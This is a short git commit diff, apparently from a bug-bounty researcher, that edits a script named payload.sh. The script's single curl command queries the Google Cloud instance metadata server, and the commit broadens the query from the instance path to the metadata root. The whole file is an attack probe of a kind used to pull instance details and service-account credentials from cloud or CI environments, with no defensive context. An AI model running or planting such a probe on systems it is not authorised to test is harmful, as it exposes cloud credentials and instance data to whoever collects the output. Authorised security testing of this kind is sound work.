d4a1f04e44f383ab6ba586a984bc313b2cf625f7
envoybughunter <envoybughunter@gmail.com>
2025-07-01 12:19:26 +0300

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
-curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/
 
